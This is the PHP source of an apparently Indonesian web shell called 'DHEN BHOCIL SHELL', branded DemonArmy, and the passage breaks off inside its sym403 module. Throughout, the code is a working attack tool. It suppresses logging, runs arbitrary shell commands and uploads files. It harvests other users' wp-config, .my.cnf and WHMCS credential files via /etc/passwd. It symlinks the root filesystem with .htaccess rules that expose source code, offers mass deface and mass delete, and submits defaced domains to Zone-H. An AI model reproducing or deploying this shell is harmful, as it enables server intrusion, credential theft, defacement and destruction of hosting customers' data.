<?php
session_start();
error_reporting(0);
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$ollekyun = "831167d1d11e16b877055beb00ffec4b"; //Bhocil
$default_action 	= 'FilesMan';
$default_use_ajax 	= true;
$default_charset 	= 'UTF-8';
date_default_timezone_set("Asia/Jakarta");
function login_shell(){
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
		<meta name='author' content='twitter.com/h4ndsatiz3r'/>
		<meta name='copyright' content='OlleKyun'/>
		<meta name='description' content='[ DemonArmy Shell ]'>
		<meta name="theme-color" content="#000">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=iceberg|Rock Salt|Righteous|Indie Flower|Share+Tech+Mono" rel="stylesheet">
    <script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>

    <title>[+] r00t ~ DHEN BHOCIL SHELL [+]</title>
    <style>
    	body{
    		background-color:black;
            text-align:center;
    		}
    	img{
    		width: 358px;
    		height: 255px;
    	}
    	input[type="password"]{
    		background-color: transparent;
    	}
        h7{
        	font-family:"Share Tech Mono";
            size:5px;
        }
        .oxp {
              background-color: #000;
              border: 1px solid #fff;
              border-radius: 2px;
              width: 120px;
              height: 34px;
              font-family:indie flower;
        }
        .btn{
        	font-family:indie flower;
            font-size:19px;
            height: 38px;
        }
    .kabur{
    		font-family:"Share Tech Mono";
            font-weight: bold;
            text-shadow: 2px 1px silver, 3px 4px #54535B;
-webkit-animation-name: blinker;
-webkit-animation-duration: 5s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 4s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 3s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: white;
}

@-moz-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }

@-webkit-keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }

@keyframes blinker {  
 0% { opacity: 1.0; }
 50% { opacity: 0.0; }
 100% { opacity: 1.0; }
 }

.bounce {
  position: relative;
  animation: bounce 1s ease-in 2s 1000 alternate none;
}
@keyframes bounce {
	from {
	  top: 0px;
	  left: 0px;
	  }
	to {
	  top: 100px;
	  bottom: 20px;
	}
}
    </style>
    <script>
function play(){ var audio = document.getElementById("lagu"); audio.play();
} 
function liat(){ document.getElementById('galiat').style.visibility="visible"; 
} 
</script>
  </head>
  <body class="text-white">
    <div class="p-3">
    	<h1 class="kabur"> r00t ~ DHEN BHOCIL SHELL</h3></font><hr>
    	<img src="https://i.ya-webdesign.com/images/rebel-drawing-skull-14.gif" class="mx-auto d-block"><hr>
    		<form method="post">
    	<div class="row">
    		<div class="col">
    			<input type="password" name="pass" class="form-control">
    		</div>
    		<div class="col">
    			<input type="submit" class="btn btn-outline-light btn-block" value="Login">
    		</div>
    	</div></form><br>
    <button class="oxp" onclick="play();liat();"><font face="Indie Flower" size="2" color="white"> Play Music </font></button>
</center><script type="text/javascript">
</script>
<script> 
</script><audio id="lagu" src="https://a.top4top.io/m_1732knyui3.mp3"></audio>
   <a href="?akses=true"><button class="oxp" onclick="akses()"><font face="Indie Flower" size="2" color="white"> Uploader </font></button>
	<hr>
		<?php
		if($_GET['akses'] == "true") {
		 echo'<form action="" method="post" enctype="multipart/form-data"><h7>
        		      	<input type="file"  name="chu" />
        		      	<input type="submit" class="btn btn-outline-light btn-block" name="upload" value="Upload"></a>
        		      	</form>' . $result . '</a></center></body></html>';
        		      	$server   = $_SERVER['DOCUMENT_ROOT'];
        		      	$namaFile = $_FILES['chu']['name'];
        		      	$getcwd   = "$namaFile";
        		      	$typeExt  = pathinfo($namaFile, PATHINFO_EXTENSION);
        		      	if(isset($_POST['upload'])){
        		      	if($namaFile !== ''){
        		      	if(is_writable($server)){
        		      	if($typeExt === 'html'){
        		      	if($namaFile !== 'index.html'){
        		      	if(@copy($_FILES['chu']['tmp_name'], $getcwd)){
        		      	$akses = 'http://'.$_SERVER['HTTP_HOST'].'/';
        		      	echo '<h7>Silahkeun Pansos sterrr<br>';
        		      	echo '<a href='.$namaFile.' target="_blank"> Click Me Senpai:3 </a></h7>';
        	          	}else{
        		      	echo "<script>
        		      	Swal.fire(
        		      	'Gagal Upload Ster',
        		      	'Mungkin Faktor Face sterr',
        		      	'error'
        		      	)</script>";
        		      	}
        		      	}else{
        		      	echo "<script>	
        		      	Swal.fire(
        		      	'Anjengg Lu',
        		      	'ehh kontol..Ngapain Upload Index Udh Di kasih Akses Mao Nikung Index',
        		      	'error'
        		      	)</script>";
        		      	}
        		      	}else{
        		      	echo "<script>
        		      	Swal.fire(
        		      	'Woii!!!',
        		      	'eh kontoll...Lu kan Cuma Bisa Up html tolol ngapain Up yg laen',
        		      	'error'
        		      	)</script>";
        		      	}
        		      	}else{
        		      	echo "<script>
        		      	Swal.fire(
        		      	'Server Eror',
        		      	'Server Ga suport mybe',
        		      	'error'
        		      	)'</script>";
        		      	}
        		      	}else{
        		      	echo "<script>
        		      	Swal.fire(
        		      	'Goblok',
        		      	'pilih file nya dulu',
        		      	'error'
        		      	)</script>";
        		      	}
        		      	}
        		      	}
        		      	?>
    	<center>
    		<small><h7><font color="white">Copyright &copy; </font><a href="http://cysec-0llexsite1307.xp3.biz/INDIHOME/">r00t ~ DHEN BHOCIL SHELL</h7></a></small>
    	</center>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
  </body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){
	if(isset($_POST['pass']) && (md5($_POST['pass']) == $ollekyun)){
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	}else{
		login_shell();
	}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#434343">
<title>r00t ~ DHEN BHOCIL SHELL'.$site.'</title>
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Philosopher&display=swap" rel="stylesheet">
<!-- font -->
<link href="http://fonts.googleapis.com/css?family=New Rocker" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Shadows">
<script src="http://e-mete.com/js/kdsnow.js" type="text/javascript"></script>
<link rel="icon" href="https://ibb.co/GWKCDSm" type="image/x-icon">
<link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>(+) r00t ~ DHEN BHOCIL SHELL (+)</title>
<meta property="og:image" content="https://ibb.co/GWKCDSm">
<meta name="description" content="[ Powered By DemonArmy ]" />
<style >
  .blink_text {
-webkit-animation-name: blinker;
-webkit-animation-duration: 2s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 2s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: red;
}
@-moz-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@-webkit-keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@keyframes blinker { 
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
 
 #copy {
  color: lime;
  font-weight: bold;
  font-family: Kelly Slab;
 }
 #copy a {
  color: white;
 }
 #copy a:hover {
  color: blue;
 }

body{
font-family: Kelly Slab;
background-color: black;
color:white;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: #15CFF4;
}
table{
border: 1px #000000;
}
.s_tb{
border:1px silver;
}
a{
color:white;
font-size: 19px;
text-decoration:none;
}
a:hover{
color:green;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 2px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
h2{
font-family:Kelly Slab;
font-size:25px;
color:white;
}
h3{
font-size:35px;
}
h4{
font-size:15px;
font-family:Kelly Slab;
color:white;
}
.oxp_table {;
  background:transparent;
  border:1px solid blue;
  font-family:Kelly Slab;
    display:inline-block;
  cursor:pointer;
  color:#15CFF4;
  font-size:10x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:none;
  text-shadow:0px -1px 0px white;
       }
       .oxp_table {;
  background:transparent;
  border:2px solid silver;
  font-family:Kelly Slab;
  color:white;
  font-size:17x;
  font-weight:bold;
  padding:3px 20px;
  text-decoration:none;
  text-shadow:0px -1px 0px #ff0505;
       }
     .potext {
  border: 1px solid #ffffff;
  width: 100%;
  height: 400px;
  padding-left: 5px;
  margin: 10px auto;
  resize: none;
  background: transparent;
  color: #ffffff;
  font-family:Kelly Slab;
  font-size: 13px;
}
</style>
</head>
<body>
<center><p class="blink_text" style="font-size:48px;
color:#0099C5;
text-shadow: 0px 0px 17px darkblue, 0px 0px 20px black;
font-family:Kelly slab;
font-weight:bold;
">(+) r00t ~ DHEN BHOCIL SHELL (+)</p></center>
<table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
<center><tr><td><font>Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
$sys = php_uname();
$home_r = $_SERVER['DOCUMENT_ROOT'];
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$ipmu = gethostbyname($_SERVER['REMOTE_ADDR']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font size=2 >ON</font>' : '<font size=2 >OFF</font>';
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font size=2 color=#B0B0B0>$ds</font>" : "<font size=2 color=#B0B0B0>NONE</font>";
$mysql = (function_exists('mysql_connect')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$wget = (exe('wget --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$perl = (exe('perl --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2  color=#B0B0B0>OFF</font>";
$python = (exe('python --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<fontsize=2  color=#B0B0B0>OFF</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
echo "<hr><center class='oxp_table'>
<a href='?' class='oxp_table'>Home</a>
<a href='?path=$path&olle=adminer' class='oxp_table'>ADMINER</a>
<a href='?path=$path&olle=csrf' class='oxp_table'>CSRF</a>
<a href='?path=$path&olle=autoeu' class='oxp_table'>AUTO EDIT USER</a>
<a href='?path=$path&olle=bypdisf' class='oxp_table'>BYPASS DISFUNC</a>
<a href='?path=$path&olle=cmd' class='oxp_table'>COMMAND</a>
<a href='?path=$path&olle=endec' class='oxp_table'>ENC&DEC</a>
<a href='?path=$path&olle=cpanel' class='oxp_table'>CPANEL RESET PASS</a><hr color=#1E1E1E>
<a href='?path=$path&olle=config' class='oxp_table'>CONFIG</a>
<a href='?path=$path&olle=rdp' class='oxp_table'>CREATE RDP</a>
<a href='?path=$path&olle=domains' class='oxp_table'>DOMAINS</a>
<a href='?path=$path&olle=dbdump' class='oxp_table'>DB DUMP</a>
<a href='?path=$path&olle=info' class='oxp_table'>INFO</a>
<a href='?path=$path&olle=jumping' class='oxp_table'>JUMPING</a>
<a href='?path=$path&olle=mass_deface' class='oxp_table'>MASS DEFACE</a>
<a href='?path=$path&olle=mass_delete' class='oxp_table'>MASS DELETE</a><hr color=#1E1E1E>
<a href='?path=$path&olle=sym' class='oxp_table'>SYM</a>
<a href='?path=$path&olle=sym403' class='oxp_table'>SYM 403</a>
<a href='?path=$path&olle=sym404' class='oxp_table'>SYM 404</a>
<a href='?path=$path&olle=smtp' class='oxp_table'>SMTP</a>
<a href='?path=$path&olle=upload' class='oxp_table'>UPLOAD</a>
<a href='?path=$path&olle=vhost' class='oxp_table'>VHOST</a>
<a href='?path=$path&olle=zoneh' class='oxp_table'>ZONE-H</a>
<a href='?path=$path&olle=hashgen' class='oxp_table'>HASH GENERATOR</a>
<a href='?path=$path&olle=killme' class='oxp_table'>KILL YOUR SELF!</a>
<hr>";
if(isset($_GET['metu'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
if($_GET['olle'] == 'upload') {
	if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo "<center><font color=#FFFFFF>UPLOAD OK</font></center><hr color=#1E1E1E>";
}else{
echo "<center><font color=#848484>UPLOAD ERROR!</font></center><hr color=#1E1E1E>";
}}
echo '<center><h2>Upload</h2><form enctype="multipart/form-data" method="POST">
<font color="white"><br><b></font><input type="file"name="file" style="widht:900px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid blue;"/>
<input type="submit" value="Upload" style="margin-top:4px;width:150px;font-family:Kelly Slab;font-size:20;background:transparent;color:white;border:2px solid blue;border-radius:5px"/><br><br>
</form><br></center>';
} elseif($_GET['olle'] == 'info') {
echo '<font color=#FFFFFF size=2>System : <font size=2 color=#B0B0B0>'.$sys.'<br></font></font>
<font color=#FFFFFF size=2>Server IP : <font size=2 color=#B0B0B0>'.$ip.' <font size=2 color=#FFFFFF>|</font> <font size=2 color=#FFFFFF >Your IP : </font><font size=2 color=#B0B0B0>'.$ipmu.'<br></font></font>
<font color=#FFFFFF size=2>Safe Mode : <font size=2 color=#B0B0B0>'.$sm.'<br></font></font>
<font color=#FFFFFF size=2>Disabled Functions : <font size=2 color=#B0B0B0>'.$show_ds.'<br></font></font>
<font color=#FFFFFF size=2>Home Root : <font size=2 color=#B0B0B0>'.$home_r.'<br></font></font>
<font color=#FFFFFF size=2>Time On Server : <font color=#B0B0B0>'.date('d M Y H:i:s',time()).'</font></font><br>
<font color=#FFFFFF size=2>User : <font color=#B0B0B0>'.$user.'</font> ('.$uid.') | Group : <font color=#B0B0B0>'.$group.'</font> ('.$gid.')</font><br>
<font color=#FFFFFF size=2>MySQL : '.$mysql.' | Perl : '.$perl.' | Python : '.$python.' | WGET : '.$wget.' | CURL : '.$curl.'<br>Version shell : 2.1';
} elseif($_GET['olle'] == 'cmd') {
echo "<center><form method='post'><font>Command : </font>
<input class='oxp_table' type='text' size='30' height='10' name='command'><input class='oxp_table' type='submit' name='colmekdeh' value='>'></form>";
	if(isset($_POST['colmekdeh'])) {
echo'<div style="margin:1px;padding:1px;text-align:center;color:white;"><pre>';
$cmd = $_POST['command'];
if($cmd == "")
{
echo "Yang bener asw-_";
 } 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div></center>';
}
} elseif($_GET['olle'] == 'config') {
$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
  $idx = mkdir("sx_conf", 0777);
  $isi_htc = "Options allnRequire NonenSatisfy Any";
  $htc = fopen("sx_conf/.htaccess","w");
  fwrite($htc, $isi_htc);
  while($passwd = fgets($etc)) {
    if($passwd == "" || !$etc) {
      echo "<font color=red>Can't read /etc/passwd</font>";
    } else {
      preg_match_all('/(.*?):x:/', $passwd, $user_config);
      foreach($user_config[1] as $sx_user) {
        $user_config_dir = "/home/$sx_user/public_html/";
        if(is_readable($user_config_dir)) {
          $grab_config = array(
            "/home/$sx_user/.my.cnf" => "cpanel",
            "/home/$sx_user/.accesshash" => "WHM-accesshash",
            "/home/$sx_user/public_html/po-content/config.php" => "Popoji",
            "/home/$sx_user/public_html/vdo_config.php" => "Voodoo",
            "/home/$sx_user/public_html/bw-configs/config.ini" => "BosWeb",
            "/home/$sx_user/public_html/config/koneksi.php" => "Lokomedia",
            "/home/$sx_user/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
            "/home/$sx_user/public_html/clientarea/configuration.php" => "WHMCS",
            "/home/$sx_user/public_html/whm/configuration.php" => "WHMCS",
            "/home/$sx_user/public_html/whmcs/configuration.php" => "WHMCS",
            "/home/$sx_user/public_html/forum/config.php" => "phpBB",
            "/home/$sx_user/public_html/sites/default/settings.php" => "Drupal",
            "/home/$sx_user/public_html/config/settings.inc.php" => "PrestaShop",
            "/home/$sx_user/public_html/app/etc/local.xml" => "Magento",
            "/home/$sx_user/public_html/joomla/configuration.php" => "Joomla",
            "/home/$sx_user/public_html/configuration.php" => "Joomla",
            "/home/$sx_user/public_html/wp/wp-config.php" => "WordPress",
            "/home/$sx_user/public_html/wordpress/wp-config.php" => "WordPress",
            "/home/$sx_user/public_html/wp-config.php" => "WordPress",
            "/home/$sx_user/public_html/admin/config.php" => "OpenCart",
            "/home/$sx_user/public_html/slconfig.php" => "Sitelok",
            "/home/$sx_user/public_html/application/config/database.php" => "Ellislab");
          foreach($grab_config as $config => $nama_config) {
            $ambil_config = file_get_contents($config);
            if($ambil_config == '') {
            } else {
              $file_config = fopen("sx_conf/$sx_user-$nama_config.txt","w");
              fputs($file_config,$ambil_config);
            }
          }
        }   
      }
    } 
  }
  echo "<br><center><a href='?path=$path/sx_conf'><font>[ DONE ]</font></a></center>";
} elseif($_GET['olle'] == 'zoneh') {if($_POST['submit']) {
echo '<center>';
		$domain = explode("rn", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=red>OK</font></li>/i", $zoneh)) {
				echo "$url -> <font>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center><form class='oxp_table' method='post'>
		<font>Defacer : </font><br>
		<input style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' type='text' name='nick' size='50' placeholder='DemonArmy'><br>
		<font>Domains : </font><br>
		<textarea style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;'style='width: 450px; height: 150px;' name='url' placeholder='https://site.com/sx.php.php'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:red;color:silver;border:2px solid red; text-align: left;''>
		</form>";
	}
	echo "</center><br>";
} elseif($_GET['olle'] == 'sym') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
if($d0mains){
@mkdir("sx_sym",0777);
@chdir("sx_sym");
@exe("ln -s / sxc");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex sx.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='sx_sym/sxc/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("sx_sym",0777);
@chdir("sx_sym");
exe("ln -s / sxc");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex sx.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('//(.*?)://s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=sx_sym/sxc/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("sx_sym",0777);@chdir("sx_sym");@exe("ln -s / sxc");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex sx.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <h2>Server Symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('//(.*?)://s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=sx_sym/sxc/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center><br>";
 }
 }    
} elseif($_GET['olle'] == 'sym403') {
	echo'<form method="post"><center>
<div style="text-align: center;"><big><span style="height: 0px;"><span style="height: 0px;"><small><span style="height: 0px;"><span style="widows: 2; text-transform: none; text-indent: 0px; white-space: normal; orphans: 2; letter-spacing: normal; color: rgb(0, 0, 0); word-spacing: 0px; font-style: normal; font-variant: normal; font-weight: 700;" class="Apple-style-span"><span style="widows: 2; text-transform: none; text-indent: 0px; font-style: normal; font-variant: normal; font-weight: normal; font-size: medium; line-height: normal; font-size-adjust: none; font-stretch: normal; white-space: normal; orphans: 2; letter-spacing: normal; color: rgb(0, 0, 0); word-spacing: 0px;" class="Apple-style-span"><span style="widows: 2; text-transform: none; text-indent: 0px; font-style: normal; font-variant: normal; font-weight: normal; font-size: medium; line-height: normal; font-size-adjust: none; font-stretch: normal; white-space: normal; orphans: 2; letter-spacing: normal; color: rgb(0, 0, 0); word-spacing: 0px;" class="Apple-style-span"><font color="white" size="6"><big><span style="font-weight: bold; text-shadow: white 0px 0px 12px; color: white;"><span lang="en-us"><span style="color: white;">Sym403<br></big>
<td<center><textarea style="color: white;background-color:transparent" cols="66" name="passwd" rows="18">';
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) { 
$str=explode(":",$usrr); 
echo $str[0]."n"; }
echo system('ls /var/mail');
echo system('ls /home');
echo'</textarea><br>
<font size="3">Home : </font>
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
</select><br>
<font size="3">.htaccess : </font>
<select name="EVILTWIN">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex EVILTWIN.id
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex EVILTWIN.id
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex EVILTWIN.id
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select>
<input style="color:black;background-color:#FFFF" name="conf" size="10"
 value="Tusbol" type="submit">
<br/><br/></form>';
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess = $_POST['EVILTWIN'];
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("n",$_POST["passwd"]); 
foreach($passwd as $pwd){ $user=trim($pwd);
symlink('/','000~ROOT~000');
copy('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
symlink('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
copy('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
symlink('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
